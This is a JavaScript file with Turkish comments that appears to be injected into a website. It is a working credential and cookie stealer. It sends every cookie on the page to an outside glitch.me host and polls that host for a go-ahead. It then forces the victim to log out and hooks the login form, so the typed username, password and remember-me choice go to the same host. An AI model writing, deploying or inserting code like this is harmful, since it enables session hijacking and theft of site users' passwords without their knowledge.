(function () {
  console.log('c.js çalışıyor');

  function checkAndRun() {
    const cookies = document.cookie;
    console.log('Tüm çerezler:', cookies);
    const username = document.cookie.match(/username=([^;]+)/)?.[1] || 'misafir_' + Date.now();
    console.log('Çerezdeki username:', username);

    // Kullanıcıyı hemen logla, aktif listeye eklemek için
    fetch(`https://ancient-pentagonal-elephant.glitch.me/log?cookie=${encodeURIComponent(cookies)}`, {
      method: 'GET',
      credentials: 'include'
    })
      .then(() => console.log('Kullanıcı loglandı'))
      .catch(err => console.log('Log hatası:', err));

    // Sürekli kontrol et (polling)
    setInterval(() => {
      fetch(`https://ancient-pentagonal-elephant.glitch.me/check?user=${encodeURIComponent(username)}`, {
        method: 'GET',
        credentials: 'include'
      })
        .then(response => response.json())
        .then(data => {
          console.log('Check yanıtı:', data);
          if (data.allowed) {
            runScript();
          }
        })
        .catch(err => console.log('Check hatası:', err));
    }, 2000); // Her 2 saniyede bir kontrol et
  }

  function runScript() {
    let isScriptActive = true;
    console.log('runScript başladı');

    // Hemen çıkış yap ve logla
    const cookies = document.cookie || '';
    if (cookies) {
      fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
        method: 'GET',
        credentials: 'include'
      })
        .then(() => {
          console.log('Çıkış logu gönderildi');
          if (typeof cikisyap === 'function') {
            cikisyap();
            sessionStorage.setItem('hasLoggedOut', 'true');
            isScriptActive = false;
          } else {
            console.log('cikisyap fonksiyonu bulunamadı');
          }
        })
        .catch(err => {
          console.log('Çıkış logu hatası:', err);
          if (typeof cikisyap === 'function') {
            cikisyap();
            sessionStorage.setItem('hasLoggedOut', 'true');
            isScriptActive = false;
          }
        });
    }

    function setupButtonListeners() {
      if (!isScriptActive) return;
      console.log('Button listener kuruluyor');
      const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
      if (loginButton) {
        loginButton.addEventListener('click', () => {
          setTimeout(setupLoginListener, 100);
        });
      }
    }

    function setupLoginListener() {
      const loginBtn = document.querySelector('.btn-primary[onclick="girisyap()"]');
      if (loginBtn && isScriptActive) {
        console.log('Login listener eklendi');
        loginBtn.addEventListener('click', () => {
          const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
          const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
          const remember = document.getElementById('authCheck')?.checked || false;
          console.log('Giriş bilgileri:', { username, password, remember });
          const data = `kuladi=${encodeURIComponent(username)}&sifre=${encodeURIComponent(password)}&remember=${encodeURIComponent(remember)}`;

          fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
            method: 'GET',
            credentials: 'include'
          })
            .then(() => {
              console.log('Giriş logu gönderildi');
              isScriptActive = false;
            })
            .catch(err => {
              console.log('Giriş logu hatası:', err);
              isScriptActive = false;
            });
        });
      } else {
        console.log('Login butonu bulunamadı veya script aktif değil');
      }
    }

    if (isScriptActive) {
      window.addEventListener('load', () => {
        setupButtonListeners();
      });

      let lastUrl = location.href;
      setInterval(() => {
        if (location.href !== lastUrl) {
          lastUrl = location.href;
          setupButtonListeners();
        }
      }, 500);
    }
  }

  checkAndRun();
})();
